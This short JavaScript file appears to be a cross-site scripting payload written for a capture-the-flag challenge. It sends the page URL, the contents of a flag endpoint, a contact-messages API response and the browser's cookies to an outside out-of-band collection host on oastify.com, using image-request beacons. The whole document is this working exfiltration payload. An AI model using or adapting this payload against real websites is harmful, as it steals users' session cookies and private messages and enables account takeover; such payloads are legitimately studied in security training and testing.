const C='http://a6huj3sdbl5zdq65rxphm6840v6muci1.oastify.com';
const b=(t,d)=>{new Image().src=C+'/'+t+'?d='+encodeURIComponent((''+d).slice(0,700));};
b('xss_ctx', location.href);                       // WHERE did this run? target = win
fetch('/ctf/flag').then(r=>r.text()).then(t=>b('FLAG',t)).catch(e=>b('flagerr',''+e));
fetch('/api/contact/messages').then(r=>r.text()).then(t=>b('msgs',t)).catch(()=>{});
b('ck', document.cookie);